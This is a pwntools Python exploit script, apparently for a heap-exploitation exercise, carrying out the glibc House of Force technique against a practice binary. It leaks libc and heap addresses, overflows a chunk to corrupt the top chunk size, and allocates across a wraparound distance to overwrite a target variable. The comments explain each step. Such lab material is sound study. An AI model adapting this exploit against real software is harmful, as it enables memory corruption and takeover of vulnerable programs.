from pwn import *

elf = context.binary = ELF('./house_of_force', checksec = False)
libc = ELF(elf.runpath + b'/libc.so.6')

context.log_level = 'info'

gs = '''
c
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()


# Grab Puts
io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
log.success(f'Puts Leaked: {hex(puts)}')


# Grab Heap
io.recvuntil(b'heap @ ')
heap = int(io.recvline(), 16)
log.success(f'Heap Leaked: {hex(heap)}')
io.timeout = 0.1


# Grab Base Address (bcs of ASLR)
libc.address = puts - libc.sym['puts']
log.success(f'Base address = {hex(libc.address)}')



## =======================================================================================================

## Make a request to allocates 24 bytes of data but writing more than that will result in a Heap Overflow

def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


### IMPORTANT: malloc() rounds requests up to the nearest chunk size in increments of 0x10 bytes / 16 bytes.
### Means that the initial size chunk will allocate 24 bytes. After that, the chunk size will add 16 bytes every
### time a request of 16 bytes is made 





# We attempt to fill 24 bytes + the largest 64 bit value, this will overwrite the top chunk size field

malloc(24, b'A'*24 + p64(0xffffffffffffffff))   # 1'st request

# This is critical because the top chunk is how the heap manages remaining memory. 
# By setting its size to the maximum, 
# We are essentially tricking malloc into thinking there's virtually unlimited memory available.





# Calculate the wraparound distance between the "top chunk" and "target" that resides in .data

def delta(x, y):
	return(0xffffffffffffffff - x) + y

distance = delta(heap + 0x30, elf.sym.target - 0x10)

# The delta value = (2'nd malloc write from top chunk addr (Heap + 48 bytes), 'Target' variable start addr
# [start addr is also the last qword addr of the previous chunk's data]

# malloc returns a pointer 16 bytes after the target addr so we need to minus the 16 bytes to get the actual 'target' addr







# Allocated the distance bytes and write 1 byte garbage value,

malloc(distance, "Y")   # 2'nd request


# After that, when we make a request from malloc, it will be serviced from the rogue top chunk and overwrite user data in the heap space

malloc(24, b'PWNED LFG')    # 3'rd request

io.interactive()